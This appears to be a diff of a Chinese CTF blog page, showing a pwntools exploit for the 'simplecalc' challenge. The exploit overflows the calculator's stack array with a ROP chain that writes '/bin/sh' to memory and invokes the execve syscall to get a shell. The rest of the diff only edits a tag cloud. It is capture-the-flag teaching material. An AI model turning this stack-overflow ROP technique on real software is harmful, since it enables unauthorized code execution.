@@ -166,7 +166,6 @@
 </li>
 <li>最后构造pop链执行<code>syscall</code></li>
 </ol>
-<p>参数：    </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">rdi -&gt; &#x27;/bin/sh&#x27;字符串指针</span><br><span class="line">rsi -&gt; 0</span><br><span class="line">rdx -&gt; 0</span><br><span class="line">rax -&gt; 0x3b</span><br><span class="line">```   </span><br><span class="line"></span><br><span class="line">## exp</span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">context(os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">mode = &#x27;&#x27;</span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">    mode = sys.argv[1]</span><br><span class="line"></span><br><span class="line">proc = process(&quot;./simplecalc&quot;)</span><br><span class="line"></span><br><span class="line">def s(x): proc.send(x)</span><br><span class="line">def sl(x): return proc.sendline(x)</span><br><span class="line">def sd(x): return proc.send(x)</span><br><span class="line">def sla(x, y): return proc.sendlineafter(x, y)</span><br><span class="line">def sa(x, y): return proc.sendafter(x, y)</span><br><span class="line">def ru(x): return proc.recvuntil(x)</span><br><span class="line">def rc(): return proc.recv()</span><br><span class="line">def rl(): return proc.recvline()</span><br><span class="line">def li(con): return log.info(con)</span><br><span class="line">def ls(con): return log.success(con)</span><br><span class="line">def pi(): return proc.interactive()</span><br><span class="line">def pcls(): return proc.close()</span><br><span class="line">def ga(): return u64(ru(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">def addSingle(x):</span><br><span class="line">	proc.recvuntil(&quot;=&gt; &quot;)</span><br><span class="line">	proc.sendline(&quot;1&quot;)</span><br><span class="line">	proc.recvuntil(&quot;Integer x: &quot;)</span><br><span class="line">	proc.sendline(&quot;100&quot;)</span><br><span class="line">	proc.recvuntil(&quot;Integer y: &quot;)</span><br><span class="line">	proc.sendline(str(x - 100))  # 注意代码要求任意参与运算的数字都要大于0x27</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(z): </span><br><span class="line">    # 注意数组中每个位置为int(dword型)，</span><br><span class="line">    # 64位栈内基本块为qword，因此要分高低32位分别存入</span><br><span class="line">	x = z &amp; 0xffffffff</span><br><span class="line">	y = ((z &amp; 0xffffffff00000000) &gt;&gt; 32) </span><br><span class="line">	addSingle(x)</span><br><span class="line">	addSingle(y)</span><br><span class="line"></span><br><span class="line">gscript = &#x27;&#x27;&#x27;</span><br><span class="line">    b main</span><br><span class="line">    b * 0x401545</span><br><span class="line">    c</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">if mode == &#x27;-d&#x27;:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line">rax_ret = 0x44db34</span><br><span class="line">rdx_ret = 0x437a85</span><br><span class="line">rdi_ret = 0x401b73</span><br><span class="line">rsi_ret = 0x401c87</span><br><span class="line">syscall = 0x400488</span><br><span class="line">dest = 0x6C4480</span><br><span class="line">mv_rdx2_prdi = 0x400aba</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># rdi_ret + dest + rdx_ret + b&#x27;/bin/sh\x00&#x27; + mv_rdx2_prdi</span><br><span class="line"># rsi_ret + p64(0) + rdx_ret + p64(0) + rax_ret + p64(0x3b) + syscall</span><br><span class="line">sla(b&#x27;calculations: &#x27;, b&#x27;100&#x27;)</span><br><span class="line">for i in range(9):</span><br><span class="line">    # 填满当前栈空间，注意填到v21时最好填0，</span><br><span class="line">    # 因为代码会对v21进行free操作，填其他的可能触发段错误</span><br><span class="line">    add(0)       </span><br><span class="line"></span><br><span class="line">add(rdi_ret)  </span><br><span class="line">add(dest)</span><br><span class="line">add(rdx_ret)</span><br><span class="line">add(0x0068732f6e69622f)   # /bin/sh</span><br><span class="line"></span><br><span class="line">add(mv_rdx2_prdi)</span><br><span class="line">add(rsi_ret)</span><br><span class="line">add(0)</span><br><span class="line">add(rdx_ret)</span><br><span class="line">add(0)</span><br><span class="line">add(rax_ret)</span><br><span class="line">add(0x3b)</span><br><span class="line">add(syscall)</span><br><span class="line"></span><br><span class="line">sla(b&#x27;=&gt; &#x27;, b&#x27;5&#x27;)</span><br><span class="line"></span><br><span class="line">pi()</span><br><span class="line">pause()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 	
 	</div>
@@ -893,45 +892,45 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/canary/">canary<span>1</span></a></li>
-		
-			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
-		
-			<li><a href="/tags/ciscn2023/">ciscn2023<span>4</span></a></li>
-		
-			<li><a href="/tags/fuzz/">fuzz<span>4</span></a></li>
-		
-			<li><a href="/tags/NSSCTF2022/">NSSCTF2022<span>1</span></a></li>
-		
-			<li><a href="/tags/nightmare/">nightmare<span>1</span></a></li>
-		
-			<li><a href="/tags/uaf/">uaf<span>1</span></a></li>
-		
-			<li><a href="/tags/include/">include<span>1</span></a></li>
+			<li><a href="/tags/reverse/">reverse<span>7</span></a></li>
 		
 			<li><a href="/tags/heap/">heap<span>2</span></a></li>
 		
-			<li><a href="/tags/str-format/">str_format<span>1</span></a></li>
+			<li><a href="/tags/php伪协议/">php伪协议<span>1</span></a></li>
+		
+			<li><a href="/tags/php/">php<span>10</span></a></li>
+		
+			<li><a href="/tags/SWPUCTF2021/">SWPUCTF2021<span>10</span></a></li>
+		
+			<li><a href="/tags/鹏城杯2022/">鹏城杯2022<span>1</span></a></li>
+		
+			<li><a href="/tags/深育杯2021/">深育杯2021<span>1</span></a></li>
 		
 			<li><a href="/tags/BJDCTF2020/">BJDCTF2020<span>1</span></a></li>
 		
-			<li><a href="/tags/nssctf/">nssctf<span>29</span></a></li>
+			<li><a href="/tags/unserialise/">unserialise<span>1</span></a></li>
 		
-			<li><a href="/tags/zer0pts2020/">zer0pts2020<span>1</span></a></li>
-		
-			<li><a href="/tags/BKP2016/">BKP2016<span>1</span></a></li>
-		
-			<li><a href="/tags/CVE/">CVE<span>4</span></a></li>
-		
-			<li><a href="/tags/stack/">stack<span>3</span></a></li>
-		
-			<li><a href="/tags/ret2syscall/">ret2syscall<span>1</span></a></li>
+			<li><a href="/tags/rce/">rce<span>1</span></a></li>
 		
 			<li><a href="/tags/SWPUCTF2022/">SWPUCTF2022<span>2</span></a></li>
 		
-			<li><a href="/tags/reverse/">reverse<span>7</span></a></li>
+			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
 		
-			<li><a href="/tags/CTF/">CTF<span>40</span></a></li>
+			<li><a href="/tags/D3CTF2019/">D3CTF2019<span>1</span></a></li>
+		
+			<li><a href="/tags/ciscn2023/">ciscn2023<span>4</span></a></li>
+		
+			<li><a href="/tags/ret2syscall/">ret2syscall<span>1</span></a></li>
+		
+			<li><a href="/tags/unserialize/">unserialize<span>4</span></a></li>
+		
+			<li><a href="/tags/GDOUCTF2023/">GDOUCTF2023<span>2</span></a></li>
+		
+			<li><a href="/tags/fuzz/">fuzz<span>4</span></a></li>
+		
+			<li><a href="/tags/canary/">canary<span>1</span></a></li>
+		
+			<li><a href="/tags/str-format/">str_format<span>1</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>39</span></a></li>
